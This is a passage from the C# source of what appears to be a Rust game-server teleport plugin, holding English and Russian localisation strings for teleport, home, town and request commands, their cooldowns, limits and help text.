                {"TPLift", "You can't teleport while in an elevator or bucket lift!"},
                {"TPBucketLift", "You can't teleport while in a bucket lift!"},
                {"TPRegLift", "You can't teleport while in an elevator!"},
                {"TPSafeZone", "You can't teleport from a safezone!"},
                {"TPFlagZone", "You can't teleport from this zone!"},
                {"TPNoEscapeBlocked", "You can't teleport while blocked!"},
                {"TPCrafting", "You can't teleport while crafting!"},
                {"TPBlockedItem", "You can't teleport while carrying: {0}!"},
                {"TPHomeSafeZoneOnly", "You can only teleport home from within a safe zone!" },
                {"TooCloseToMon", "You can't teleport so close to the {0}!"},
                {"TooCloseToCave", "You can't teleport so close to a cave!"},
                {"HomeTooCloseToCave", "You can't set home so close to a cave!"},
                {"HomeTooCloseToMon", "You can't set home so close to a monument!"},
                {"CannotTeleportFromHome", "You must leave your base to be able to teleport!"},
                {"WaitGlobalCooldown", "You must wait {0} on your global teleport cooldown!" },
                {"DM_TownTP", "You teleported to {0}!"},
                {"DM_TownTPNoLocation", "<color=yellow>{0}</color> location is currently not set!"},
                {"DM_TownTPDisabled", "<color=yellow>{0}</color> is currently disabled in config file!"},
                {"DM_TownTPLocation", "You have set the <color=yellow>{0}</color> location to {1}!"},
                {"DM_TownTPCreated", "You have created the command: <color=yellow>{0}</color>"},
                {"DM_TownTPRemoved", "You have removed the command: <color=yellow>{0}</color>"},
                {"DM_TownTPDoesNotExist", "Command does not exist: <color=yellow>{0}</color>"},
                {"DM_TownTPExists", "Command <color=yellow>{0}</color> already exists!"},
                {"DM_TownTPLocationsCleared", "You have cleared all locations for {0}!"},
                {"DM_TownTPStarted", "Teleporting to {0} in {1} seconds!"},
                {"DM_TownTPCooldown", "Your teleport is currently on cooldown. You'll have to wait {0} for your next teleport."},
                {"DM_TownTPCooldownBypass", "Your teleport request was on cooldown. You chose to bypass that by paying {0} from your balance."},
                {"DM_TownTPCooldownBypassF", "Your teleport is currently on cooldown. You do not have sufficient funds ({0}) to bypass."},
                {"DM_TownTPCooldownBypassP", "You may choose to pay {0} to bypass this cooldown." },
                {"DM_TownTPCooldownBypassP2", "Type <color=yellow>/{0} {1}</color>" },
                {"DM_TownTPLimitReached", "You have reached the daily limit of {0} teleports today! You'll have to wait {1} for your next teleport."},
                {"DM_TownTPAmount", "You have {0} <color=yellow>{1}</color> teleports left today!"},

                { "Days", "Days" },
                { "Hours", "Hours" },
                { "Minutes", "Minutes" },
                { "Seconds", "Seconds" },

                {"Interrupted", "Your teleport was interrupted!"},
                {"InterruptedTarget", "{0}'s teleport was interrupted!"},
                {"Unlimited", "Unlimited"},
                {
                    "TPInfoGeneral", string.Join(NewLine, new[]
                    {
                        "Please specify the module you want to view the info of.",
                        "The available modules are: ",
                    })
                },
                {
                    "TPHelpGeneral", string.Join(NewLine, new[]
                    {
                        "/tpinfo - Shows limits and cooldowns.",
                        "Please specify the module you want to view the help of.",
                        "The available modules are: ",
                    })
                },
                {
                    "TPHelpadmintp", string.Join(NewLine, new[]
                    {
                        "As an admin you have access to the following commands:",
                        "/tp \"targetplayer\" - Teleports yourself to the target player.",
                        "/tp \"player\" \"targetplayer\" - Teleports the player to the target player.",
                        "/tp x y z - Teleports you to the set of coordinates.",
                        "/tpl - Shows a list of saved locations.",
                        "/tpl \"location name\" - Teleports you to a saved location.",
                        "/tpsave \"location name\" - Saves your current position as the location name.",
                        "/tpremove \"location name\" - Removes the location from your saved list.",
                        "/tpb - Teleports you back to the place where you were before teleporting.",
                        "/home radius \"radius\" - Find all homes in radius.",
                        "/home delete \"player name|id\" \"home name\" - Remove a home from a player.",
                        "/home tp \"player name|id\" \"name\" - Teleports you to the home location with the name 'name' from the player.",
                        "/home homes \"player name|id\" - Shows you a list of all homes from the player."
                    })
                },
                {
                    "TPHelphome", string.Join(NewLine, new[]
                    {
                        "With the following commands you can set your home location to teleport back to:",
                        "/home add \"name\" - Saves your current position as the location name.",
                        "/home list - Shows you a list of all the locations you have saved.",
                        "/home remove \"name\" - Removes the location of your saved homes.",
                        "/home \"name\" - Teleports you to the home location."
                    })
                },
                {
                    "TPHelptpr", string.Join(NewLine, new[]
                    {
                        "With these commands you can request to be teleported to a player or accept someone else's request:",
                        "/tpr \"player name\" - Sends a teleport request to the player.",
                        "/tpa - Accepts an incoming teleport request.",
                        "/tpat - Toggle automatic /tpa on incoming teleport requests.",
                        "/tpc - Cancel teleport or request."
                    })
                },
                {
                    "TPSettingsGeneral", string.Join(NewLine, new[]
                    {
                        "Please specify the module you want to view the settings of. ",
                        "The available modules are:",
                    })
                },
                {
                    "TPSettingshome", string.Join(NewLine, new[]
                    {
                        "Home System has the current settings enabled:",
                        "Time between teleports: {0}",
                        "Daily amount of teleports: {1}",
                        "Amount of saved Home locations: {2}"
                    })
                },
                {
                    "TPSettingsbandit", string.Join(NewLine, new[]
                    {
                        "Bandit System has the current settings enabled:",
                        "Time between teleports: {0}",
                        "Daily amount of teleports: {1}"
                    })
                },
                {
                    "TPSettingsoutpost", string.Join(NewLine, new[]
                    {
                        "Outpost System has the current settings enabled:",
                        "Time between teleports: {0}",
                        "Daily amount of teleports: {1}"
                    })
                },
                {
                    "TPSettingstpr", string.Join(NewLine, new[]
                    {
                        "TPR System has the current settings enabled:",
                        "Time between teleports: {0}",
                        "Daily amount of teleports: {1}"
                    })
                },
                {
                    "TPSettingstown", string.Join(NewLine, new[]
                    {
                        "Town System has the current settings enabled:",
                        "Time between teleports: {0}",
                        "Daily amount of teleports: {1}"
                    })
                },
                {
                    "TPSettingsdynamic", string.Join(NewLine, new[]
                    {
                        "{0} System has the current settings enabled:",
                        "Time between teleports: {1}",
                        "Daily amount of teleports: {2}"
                    })
                },
                {"PlayerNotFound", "The specified player couldn't be found please try again!"},
                {"MultiplePlayers", "Found multiple players: {0}"},
                {"CantTeleportToSelf", "You can't teleport to yourself!"},
                {"CantTeleportPlayerToSelf", "You can't teleport a player to himself!"},
                {"TeleportPendingTPC", "You can't initiate another teleport while you have a teleport pending! Use /tpc to cancel this."},
                {"TeleportPendingTarget", "You can't request a teleport to someone who's about to teleport!"},
                {"LocationExists", "A location with this name already exists at {0}!"},
                {"LocationExistsNearby", "A location with the name {0} already exists near this position!"},
                {"LocationNotFound", "Couldn't find a location with that name!"},
                {"NoPreviousLocationSaved", "No previous location saved!"},
                {"HomeExists", "You have already saved a home location by this name!"},
                {"HomeExistsNearby", "A home location with the name {0} already exists near this position!"},
                {"HomeNotFound", "Couldn't find your home with that name!"},
                {"InvalidCoordinates", "The coordinates you've entered are invalid!"},
                {"InvalidHelpModule", "Invalid module supplied!"},
                {"InvalidCharacter", "You have used an invalid character, please limit yourself to the letters a to z and numbers."},
                {
                    "SyntaxCommandTP", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tp command as follows:",
                        "/tp \"targetplayer\" - Teleports yourself to the target player.",
                        "/tp \"player\" \"targetplayer\" - Teleports the player to the target player.",
                        "/tp x y z - Teleports you to the set of coordinates.",
                        "/tp \"player\" x y z - Teleports the player to the set of coordinates."
                    })
                },
                {
                    "SyntaxCommandTPL", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tpl command as follows:",
                        "/tpl - Shows a list of saved locations.",
                        "/tpl \"location name\" - Teleports you to a saved location."
                    })
                },
                {
                    "SyntaxCommandTPSave", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tpsave command as follows:",
                        "/tpsave \"location name\" - Saves your current position as 'location name'."
                    })
                },
                {
                    "SyntaxCommandTPRemove", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tpremove command as follows:",
                        "/tpremove \"location name\" - Removes the location with the name 'location name'."
                    })
                },
                {
                    "SyntaxCommandTPN", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tpn command as follows:",
                        "/tpn \"targetplayer\" - Teleports yourself the default distance behind the target player.",
                        "/tpn \"targetplayer\" \"distance\" - Teleports you the specified distance behind the target player."
                    })
                },
                {
                    "SyntaxCommandSetHome", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /home add command as follows:",
                        "/home add \"name\" - Saves the current location as your home with the name 'name'."
                    })
                },
                {
                    "SyntaxCommandRemoveHome", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /home remove command as follows:",
                        "/home remove \"name\" - Removes the home location with the name 'name'."
                    })
                },
                {
                    "SyntaxCommandHome", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /home command as follows:",
                        "/home \"name\" - Teleports yourself to your home with the name 'name'.",
                        "/home \"name\" pay - Teleports yourself to your home with the name 'name', avoiding cooldown by paying for it.",
                        "/home add \"name\" - Saves the current location as your home with the name 'name'.",
                        "/home list - Shows you a list of all your saved home locations.",
                        "/home remove \"name\" - Removes the home location with the name 'name'."
                    })
                },
                {
                    "SyntaxCommandHomeAdmin", string.Join(NewLine, new[]
                    {
                        "/home radius \"radius\" - Shows you a list of all homes in radius(10).",
                        "/home delete \"player name|id\" \"name\" - Removes the home location with the name 'name' from the player.",
                        "/home tp \"player name|id\" \"name\" - Teleports you to the home location with the name 'name' from the player.",
                        "/home homes \"player name|id\" - Shows you a list of all homes from the player."
                    })
                },
                {
                    "SyntaxCommandTown", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /town command as follows:",
                        "/town - Teleports yourself to town.",
                        "/town pay - Teleports yourself to town, paying the penalty."
                    })
                },
                {
                    "SyntaxCommandTownAdmin", string.Join(NewLine, new[]
                    {
                        "/town set - Saves the current location as town.",
                    })
                },
                {
                    "SyntaxCommandOutpost", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /outpost command as follows:",
                        "/outpost - Teleports yourself to the Outpost.",
                        "/outpost pay - Teleports yourself to the Outpost, paying the penalty."
                    })
                },
                {
                    "SyntaxCommandOutpostAdmin", string.Join(NewLine, new[]
                    {
                        "/outpost set - Saves the current location as Outpost.",
                    })
                },
                {
                    "SyntaxCommandBandit", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /bandit command as follows:",
                        "/bandit - Teleports yourself to the Bandit Town.",
                        "/bandit pay - Teleports yourself to the Bandit Town, paying the penalty."
                    })
                },
                {
                    "SyntaxCommandBanditAdmin", string.Join(NewLine, new[]
                    {
                        "/bandit set - Saves the current location as Bandit Town.",
                    })
                },
                {
                    "SyntaxCommandHomeDelete", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /home delete command as follows:",
                        "/home delete \"player name|id\" \"name\" - Removes the home location with the name 'name' from the player."
                    })
                },
                {
                    "SyntaxCommandHomeAdminTP", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /home tp command as follows:",
                        "/home tp \"player name|id\" \"name\" - Teleports you to the home location with the name 'name' from the player."
                    })
                },
                {
                    "SyntaxCommandHomeHomes", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /home homes command as follows:",
                        "/home homes \"player name|id\" - Shows you a list of all homes from the player."
                    })
                },
                {
                    "SyntaxCommandListHomes", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /home list command as follows:",
                        "/home list - Shows you a list of all your saved home locations."
                    })
                },
                {
                    "SyntaxCommandTPR", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tpr command as follows:",
                        "/tpr \"player name\" - Sends out a teleport request to 'player name'."
                    })
                },
                {
                    "SyntaxCommandTPA", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tpa command as follows:",
                        "/tpa - Accepts an incoming teleport request."
                    })
                },
                {
                    "SyntaxCommandTPC", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the /tpc command as follows:",
                        "/tpc - Cancels an teleport request."
                    })
                },
                {
                    "SyntaxConsoleCommandToPos", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the teleport.topos console command as follows:",
                        " > teleport.topos \"player\" x y z"
                    })
                },
                {
                    "SyntaxConsoleCommandToPlayer", string.Join(NewLine, new[]
                    {
                        "A Syntax Error Occurred!",
                        "You can only use the teleport.toplayer console command as follows:",
                        " > teleport.toplayer \"player\" \"target player\""
                    })
                },
                {"LogTeleport", "{0} teleported to {1}."},
                {"LogTeleportPlayer", "{0} teleported {1} to {2}."},
                {"LogTeleportBack", "{0} teleported back to previous location."}
            };

            foreach (var key in config.DynamicCommands.Keys)
            {
                en[key] = key;
            }

            lang.RegisterMessages(en, this, "en");

            var ru = new Dictionary<string, string>
            {
                {"ErrorTPR", "Телепорт к {0} блокирован ({1})"},
                {"AdminTP", "Вы телепортированы к {0}!"},
                {"AdminTPTarget", "{0} телепортировал вас!"},
                {"AdminTPPlayers", "Вы телепортировали {0} к {1}!"},
                {"AdminTPPlayer", "{0} телепортировал вас к {1}!"},
                {"AdminTPPlayerTarget", "{0} телепортировал {1} к вам!"},
                {"AdminTPCoordinates", "Вы телепортированы к {0}!"},
                {"AdminTPTargetCoordinates", "Вы телепортировали {0} к {1}!"},
                {"AdminTPOutOfBounds", "Вы пытались телепортироваться к координатам вне границ карты!"},
                {"AdminTPBoundaries", "Значения X и Z должны быть между -{0} и {0}, а значение Y между -100 и 2000!"},
                {"AdminTPLocation", "Вы телепортированы к {0}!"},
                {"AdminTPLocationSave", "Вы сохранили текущее местоположение!"},
                {"AdminTPLocationRemove", "Вы удалили местоположение {0}!"},
                {"AdminLocationList", "Доступны следующие местоположения:"},
                {"AdminLocationListEmpty", "Вы не сохранили никаких местоположений!"},
                {"AdminTPBack", "Вы телепортированы назад, в ваше предыдущее местоположение!"},
                {"AdminTPBackSave", "Ваше предыдущее местоположение сохранено, используйте <color=yellow>/tpb</color>, чтобы телепортироваться назад!"},
                {"AdminTPTargetCoordinatesTarget", "{0} телепортировал вас к {1}!"},
                {"AdminTPConsoleTP", "Вы были телепортированы к {0}"},
                {"AdminTPConsoleTPPlayer", "Вы были телепортированы к {0}"},
                {"AdminTPConsoleTPPlayerTarget", "{0} был телепортирован к вам!"},
                {"HomeTP", "Вы телепортированы в ваш дом '{0}'!"},
                {"HomeAdminTP", "Вы телепортированы к дому '{1}' принадлежащему {0}!"},
                {"HomeSave", "Вы сохранили текущее местоположение как ваш дом!"},
                {"HomeNoFoundation", "Использовать местоположение в качестве дома разрешено только на фундаменте!"},
                {"HomeFoundationNotOwned", "Вы не можете использовать команду home в чужом доме."},
                {"HomeFoundationUnderneathFoundation", "Вы не можете использовать команду home на фундаменте, который находится под другим фундаментом."},
                {"HomeFoundationNotFriendsOwned", "Вы, или ваш друг, должны быть владельцем дома, чтобы использовать команду home!"},
                {"HomeRemovedInvalid", "Ваш дом '{0}' был удалён потому, что не на фундаменте, или у фундамента новый владелец!"},
                {"HighWallCollision", "Столкновение Высоких Стен!"},
                {"HomeRemovedInsideBlock", "Ваш дом '{0}' был удалён потому, что внутри фундамента!"},
                {"HomeRemove", "Вы удалили свой дом {0}!"},
                {"HomeDelete", "Вы удалили дом '{1}' принадлежащий {0}!"},
                {"HomeList", "Доступны следующие дома:"},
                {"HomeListEmpty", "Вы не сохранили ни одного дома!"},
                {"HomeMaxLocations", "Невозможно установить здесь ваш дом, вы достигли лимита в {0} домов!"},
                {"HomeQuota", "Вы установили {0} из {1} максимально возможных домов!"},
                {"HomeTPStarted", "Телепортация в ваш дом {0} через {1} секунд!"},
                {"PayToTown", "Стандартный платеж {0} распространяется на все телепорты в город!"},
                {"PayToTPR", "Стандартный платеж {0} распространяется на все tpr'ы!"},
                {"HomeTPCooldown", "Ваш телепорт перезаряжается. Вам необходимо подождать {0} до следующей телепортации."},
                {"HomeTPCooldownBypass", "Ваш телепорт был на перезарядке. Вы выбрали избежать ожидания, оплатив {0} с вашего баланса."},
                {"HomeTPCooldownBypassF", "Ваш телепорт перезаряжается. У вас недостаточно средств - {0} - чтобы избежать ожидания."},
                {"HomeTPCooldownBypassP", "Вы можете выбрать оплатить {0} чтобы избежать ожидания перезарядки." },
                {"HomeTPCooldownBypassP2", "Напишите <color=yellow>/home \"название дома\" {0}</color>." },
                {"HomeTPLimitReached", "Вы исчерпали ежедневный лимит {0} телепортаций сегодня!"},
                {"HomeTPAmount", "У вас осталось {0} телепортаций домой сегодня!"},
                {"HomesListWiped", "Вы очистили все местоположения, сохранённые как дом!"},
                {"HomeTPBuildingBlocked", "Вы не можете сохранить местоположение в качестве дома, если у вас нет прав на строительство в этой зоне!"},
                {"HomeTPSwimming", "Вы не можете устанавливать местоположение а качестве дома пока плывёте!"},
                {"HomeTPCrafting", "Вы не можете устанавливать местоположение а качестве дома в процессе крафта!"},
                {"Request", "Вы запросили телепортацию к {0}!"},
                {"RequestTarget", "{0} запросил телепортацию к вам! Используйте <color=yellow>/tpa</color>, чтобы принять!"},
                {"TPR_NoClan_NoFriend_NoTeam", "Эта команда доступна только друзьям, участникам команды или клана!"},
                {"PendingRequest", "У вас уже есть активный запрос, отмените его, ожидайте подтверждения, либо отмены по таймауту!"},
                {"PendingRequestTarget", "У игрока, к которому вы хотите телепортироваться уже есть активный запрос, попробуйте позже!"},
                {"NoPendingRequest", "У вас нет активных запросов на телепортацию!"},
                {"AcceptOnRoof", "Вы не можете принять запрос на телепортацию стоя на потолке, спуститесь на уровень фундамента!"},
                {"Accept", "{0} принял ваш запрос! Телепортация через {1} секунд!"},
                {"AcceptTarget", "Вы приняли запрос на телепортацию {0}!"},
                {"AcceptToggleOff", "Вы отключили автоматическое /tpa!"},
                {"AcceptToggleOn", "Вы включили автоматическое /tpa!"},
                {"NotAllowed", "Вам не разрешено использовать эту команду!"},
                {"Success", "Вы телепортированы к {0}!"},
                {"SuccessTarget", "{0} телепортирован к вам!"},
                {"Cancelled", "Ваш запрос на телепортацию к {0} был отменён!"},
                {"CancelledTarget", "Запрос на телепортацию {0} был отменён!"},
                {"TPCancelled", "Ваша телепортация отменена!"},
                {"TPCancelledTarget", "{0} отменил телепортацию!"},
                {"TPYouCancelledTarget", "Вы отменили телепортацию {0}!"},
                {"TimedOut", "{0} не ответил на ваш запрос во время!"},
                {"TimedOutTarget", "Вы не ответили вовремя на запрос телепортации от {0}!"},
                {"TargetDisconnected", "{0} отключился, ваша телепортация отменена!"},
                {"TPRCooldown", "Ваши запросы на телепортацию в данный момент на перезарядке. Вам необходимо подождать {0} прежде чем отправить следующий запрос."},
                {"TPRCooldownBypass", "Ваши запросы на телепортацию были на перезарядке. Вы выбрали избежать ожидания, оплатив {0} с вашего баланса."},
                {"TPRCooldownBypassF", "Ваши запросы на телепортацию в данный момент на перезарядке. У вас недостаточно средств - {0} - чтобы избежать ожидания."},
                {"TPRCooldownBypassP", "Вы можете выбрать оплатить {0} чтобы избежать ожидания перезарядки." },
                {"TPMoney", "{0} списано с вашего аккаунта!"},
                {"TPNoMoney", "У вас нет {0} ни на одном аккаунте!"},
                {"TPRCooldownBypassP2", "Напишите <color=yellow>/tpr {0}</color>." },
                {"TPRCooldownBypassP2a", "Напишите <color=yellow>/tpr \"имя игрока\" {0}</color>." },
                {"TPRLimitReached", "Вы исчерпали ежедневный лимит {0} запросов на телепортацию сегодня!"},
                {"TPRAmount", "У вас осталось {0} запросов на телепортацию на сегодня!"},
                {"TPRTarget", "Ваша цель в данный момент не доступна!"},
                {"TPDead", "Вы не можете телепортироваться, пока мертвы!"},
                {"TPWounded", "Вы не можете телепортироваться, будучи раненым!"},
                {"TPTooCold", "Вам слишком холодно для телепортации!"},
                {"TPTooHot", "Вам слишком жарко для телепортации!"},
                {"TPBoat", "Вы не можете телепортироваться находясь на лодке!"},
                {"TPHostile", "Вы не можете телепортироваться в Город NPC или Лагерь бандитов пока враждебны!"},
                {"TPJunkpile", "Вы не можете телепортироваться с кучи мусора"},
                {"HostileTimer", "Телепорт станет доступен через {0} минут."},
                {"TPMounted", "Вы не можете телепортироваться, когда сидите!"},
                {"TPBuildingBlocked", "Вы не можете телепортироваться, находясь в зоне блокировки строительства!"},
                //{"TPInsideTerrainFrom", "Вы не можете телепортироваться, находясь внутри местности!"},
                //{"TPInsideTerrainTo", "Вы не можете телепортироваться в место, которое находится внутри местности!"},
                {"TPAboveWater", "Вы не можете телепортироваться находясь над водой!"},
                {"TPTargetBuildingBlocked", "Вы не можете телепортироваться в зону, где блокировано строительство!"},
                {"TPTargetInsideBlock", "Вы не можете телепортироваться в фундамент!"},
                {"TPSwimming", "Вы не можете телепортироваться, пока плывёте!"},
                {"TPCargoShip", "Вы не можете телепортироваться с грузового корабля!"},
                {"TPOilRig", "Вы не можете телепортироваться с нефтяной вышки!"},
                {"TPExcavator", "Вы не можете телепортироваться с экскаватора!"},
                {"TPHotAirBalloon", "Вы не можете телепортироваться с, или на воздушный шар!"},
                {"TPLift", "Вы не можете телепортироваться находясь в лифте или подъемнике!"},
                {"TPBucketLift", "Вы не можете телепортироваться находясь в ковшевом подъемнике!"},
                {"TPRegLift", "Вы не можете телепортироваться находясь в лифте!"},
                {"TPSafeZone", "Вы не можете телепортироваться из безопасной зоны!"},
                {"TPFlagZone", "Вы не можете телепортироваться из этой зоны!"},
                {"TPNoEscapeBlocked", "Вы не можете телепортироваться пока активна блокировка!"},
                {"TPCrafting", "Вы не можете телепортироваться в процессе крафта!"},
                {"TPBlockedItem", "Вы не можете телепортироваться пока несёте: {0}!"},
                {"TooCloseToMon", "Вы не можете телепортироваться так близко к {0}!"},
                {"TPHomeSafeZoneOnly", "Вы можете телепортироваться домой только из безопасной зоны!" },
                {"TooCloseToCave", "Вы не можете телепортироваться так близко к пещере!"},
                {"HomeTooCloseToCave", "Вы не можете сохранить местоположение в качестве дома так близко к пещере!"},
                {"HomeTooCloseToMon", "Вы не можете сохранить местоположение в качестве дома так близко к монументу!"},
                {"CannotTeleportFromHome", "Вы должны выйти из вашей базы, прежде чем телепортироваться!"},
                {"WaitGlobalCooldown", "Вы должны подождать {0}, пока ваш глобальный телепорт перезаряжается!" },

                {"DM_TownTP", "Вы телепортированы в {0}!"},
                {"DM_TownTPNoLocation", "Местоположение <color=yellow>{0}</color> в данный момент не установлено!"},
                {"DM_TownTPDisabled", "<color=yellow>{0}</color> в данный момент отключен в файле настройек!"},
                {"DM_TownTPLocation", "Вы установили местоположение <color=yellow>{0}</color> в {1}!"},
                {"DM_TownTPCreated", "Вы создали команду: <color=yellow>{0}</color>"},
                {"DM_TownTPRemoved", "Вы удалили команду: <color=yellow>{0}</color>"},
                {"DM_TownTPDoesNotExist", "Команда не существует: <color=yellow>{0}</color>"},
                {"DM_TownTPExists", "Команда <color=yellow>{0}</color> уже сущуствует!"},
                {"DM_TownTPLocationsCleared", "You have cleared all locations for {0}!"},
                {"DM_TownTPStarted", "Телепортация в {0} через {1} секунд!"},
                {"DM_TownTPCooldown", "Ваш телепорт перезаряжается. Вам необходимо подождать {0} до следующей телепортации."},
                {"DM_TownTPCooldownBypass", "Ваш телепорт был на перезарядке. Вы выбрали избежать ожидания, оплатив {0} с вашего баланса."},
                {"DM_TownTPCooldownBypassF", "Ваш телепорт перезаряжается. У вас недостаточно средств ({0}) чтобы избежать ожидания."},
                {"DM_TownTPCooldownBypassP", "Вы можете выбрать оплатить {0} чтобы избежать ожидания перезарядки." },
                {"DM_TownTPCooldownBypassP2", "Введите <color=yellow>/{0} {1}</color>" },
                {"DM_TownTPLimitReached", "Вы исчерпали ежедневный лимит {0} телепортаций сегодня! Вам необходимо подождать {1} до следующей телепортации."},
                {"DM_TownTPAmount", "У вас осталось {0} телепортаций <color=yellow>{1}</color> сегодня!"},

                {"Days", "дней" },
                {"Hours", "часов" },
                {"Minutes", "минут" },
                {"Seconds", "секунд" },

                {"Interrupted", "Ваша телепортация была прервана!"},
                {"InterruptedTarget", "Телепортация {0} была прервана!"},
                {"Unlimited", "Не ограничено"},
                {
                    "TPInfoGeneral", string.Join(NewLine, new[]
                    {
                        "Пожалуйста, укажите модуль, о котором вы хотите просмотреть информацию.",
                        "Доступные модули: ",
                    })
                },
                {
                    "TPHelpGeneral", string.Join(NewLine, new[]
                    {
                        "<color=yellow>/tpinfo</color> - Отображает лимиты и перезарядки.",
                        "Пожалуйста, укажите модуль, по которому вы хотите получить помощь.",
                        "Доступные модули: ",
                    })
                },
                {
                    "TPHelpadmintp", string.Join(NewLine, new[]
                    {
                        "Как админ, вы имеете доступ к следующим командам:",
                        "<color=yellow>/tp \"имя игрока\"</color> - Телепортирует вас к указанному игроку.",
                        "<color=yellow>/tp \"имя игрока\" \"имя игрока 2\"</color> - Телепортирует игрока с именем 'имя игрока' к игроку 'имя игрока 2'.",
                        "<color=yellow>/tp x y z</color> - Телепортирует вас к указанным координатам.",
                        "<color=yellow>/tpl</color> - Отображает список сохранённых местоположений.",
                        "<color=yellow>/tpl \"название местоположения\"</color> - Телепортирует вас в сохранённое местоположение.",
                        "<color=yellow>/tpsave \"название местоположения\"</color> - Сохраняет ваше текущее местоположение с указанным названием.",
                        "<color=yellow>/tpremove \"название местоположения\"</color> - Удаляет местоположение из списка сохранённых.",
                        "<color=yellow>/tpb</color> - Телепортирует вас назад на место, где вы были перед телепортацией.",
                        "<color=yellow>/home radius \"радиус\"</color> - Найти все дома в радиусе.",
                        "<color=yellow>/home delete \"имя игрока или ID\" \"название дома\"</color> - Удаляет дом с указанным именем принадлежащий указанному игроку.",
                        "<color=yellow>/home tp \"имя игрока или ID\" \"название дома\"</color> - Телепортирует вас в дом игрока с указанным названием принадлежащий указанному игроку.",
                        "<color=yellow>/home homes \"имя игрока или ID\"</color> - Отображает вам список всех домов, принадлежащих указанному игроку."
                    })
                },
                {
                    "TPHelphome", string.Join(NewLine, new[]
                    {
                        "Используя следующие команды, вы можете установить местоположение вашего дома, чтобы затем в него телепортироваться:",
                        "<color=yellow>/home add \"название дома\"</color> - Сохраняет ваше текущее местоположение как ваш дом с указанным названием.",
                        "<color=yellow>/home list</color> - Отображает список всех местоположений, сохранённых вами как дом.",
                        "<color=yellow>/home remove \"название дома\"</color> - Удаляет расположение сохранённого дома с указанным названием.",
                        "<color=yellow>/home \"название дома\"</color> - Телепортирует вас в местоположение дома с указанным названием."
                    })
                },
                {
                    "TPHelptpr", string.Join(NewLine, new[]
                    {
                        "Используя эти команды, вы можете отправить запрос на телепортацию к игроку, или принять чей-то запрос:",
                        "<color=yellow>/tpr \"имя игрока\"</color> - Отправляет запрос на телепортацию игроку с указанным именем.",
                        "<color=yellow>/tpa</color> - Принять входящий запрос на телепортацию.",
                        "<color=yellow>/tpat</color> - Вкл./Выкл. автоматическое принятие входящих запросов на телепортацию к вам /tpa.",
                        "<color=yellow>/tpc</color> - Отменить запрос на телепортацию."
                    })
                },
                {
                    "TPSettingsGeneral", string.Join(NewLine, new[]
                    {
                        "Пожалуйста, укажите модуль, настройки которого вы хотите просмотреть. ",
                        "Доступные модули:",
                    })
                },
                {
                    "TPSettingshome", string.Join(NewLine, new[]
                    {
                        "Система домов в данный момент имеет следующие включённые параметры:",
                        "Время между телепортами: {0}",
                        "Ежедневный лимит телепортаций: {1}",
                        "Количество сохранённых домов: {2}"
                    })
                },
                {
                    "TPSettingsbandit", string.Join(NewLine, new[]
                    {
                        "Система Лагерь бандитов в данный момент имеет следующие включённые параметры:",
                        "Время между телепортами: {0}",
                        "Ежедневный лимит телепортаций: {1}"
                    })
                },
                {
                    "TPSettingsoutpost", string.Join(NewLine, new[]
                    {
                        "Система Город NPC в данный момент имеет следующие включённые параметры:",
                        "Время между телепортами: {0}",
                        "Ежедневный лимит телепортаций: {1}"
                    })
                },
                {
                    "TPSettingstpr", string.Join(NewLine, new[]
                    {
                        "Система TPR в данный момент имеет следующие включённые параметры:",
                        "Время между телепортами: {0}",
                        "Ежедневный лимит телепортаций: {1}"
                    })
                },
                {
                    "TPSettingstown", string.Join(NewLine, new[]
                    {
                        "В Системе Городов включены следующие параметры:",
                        "Время между телепортами: {0}",
                        "Ежедневный лимит телепортаций: {1}"
                    })
                },
                {
                    "TPSettingsdynamic", string.Join(NewLine, new[]
                    {
                        "В Системе {0} включены следующие параметры:",
                        "Время между телепортами: {1}",
                        "Ежедневный лимит телепортаций: {2}"
                    })
                },
                {"PlayerNotFound", "Указанный игрок не обнаружен, пожалуйста попробуйте ещё раз!"},
                {"MultiplePlayers", "Найдено несколько игроков: {0}"},
                {"CantTeleportToSelf", "Вы не можете телепортироваться к самому себе!"},
                {"CantTeleportPlayerToSelf", "Вы не можете телепортровать игрока к самому себе!"},
                {"TeleportPendingTPC", "Вы не можете инициировать телепортацию, пока у вас есть активный запрос! Используйте <color=yellow>/tpc</color> чтобы отменить его."},
                {"TeleportPendingTarget", "Вы не можете отправить запрос к тому, кто в процессе телепортации!"},
                {"LocationExists", "Местоположение с таким названием уже существует в {0}!"},
                {"LocationExistsNearby", "Местоположение с названием {0} уже существует рядом с текущей позицией!"},
                {"LocationNotFound", "Не найдено местоположение с таким названием!"},
                {"NoPreviousLocationSaved", "Предыдущее местоположение не сохранено!"},
                {"HomeExists", "Вы уже сохранили дом с таким названием!"},
                {"HomeExistsNearby", "Дом с названием {0} уже существует рядом с текущей позицией!"},
                {"HomeNotFound", "Дом с таким названием не найден!"},
                {"InvalidCoordinates", "Вы указали неверные координаты!"},
                {"InvalidHelpModule", "Указан неверный модуль!"},
                {"InvalidCharacter", "Вы использовали недопустимый символ, ограничьтесь буквами от a до z и цифрами."},
                {
                    "SyntaxCommandTP", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
